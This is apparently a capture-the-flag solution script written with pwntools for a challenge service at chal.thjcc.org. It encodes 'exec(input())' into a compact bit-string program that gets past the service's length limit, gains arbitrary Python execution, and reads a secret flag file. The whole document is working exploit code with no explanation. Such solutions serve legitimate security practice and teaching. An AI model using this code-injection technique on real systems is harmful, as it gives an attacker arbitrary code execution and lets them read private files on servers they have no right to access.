from pwn import *

HOST, PORT = "chal.thjcc.org", 9002
FLAG_PATH = "/hereisasupersecretfile/flag.txt"

context.log_level = "info"

def ctfuck(payload: bytes) -> str:
    bits = "".join(str((b >> i) & 1) for b in payload for i in range(8))
    return bits.rstrip("0") + "\n.$[2|2]"


def run(python_line: str) -> bytes:
    prog = ctfuck(b"exec(input())")
    assert len(prog) <= 110, len(prog)

    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b">>> ")
    io.sendline(prog.encode())
    io.sendline(b"EOF")
    io.sendline(python_line.encode())
    out = io.recvall(timeout=12)
    io.close()
    return out


print(run(f"print(open({FLAG_PATH!r}).read())").decode(errors="replace"))
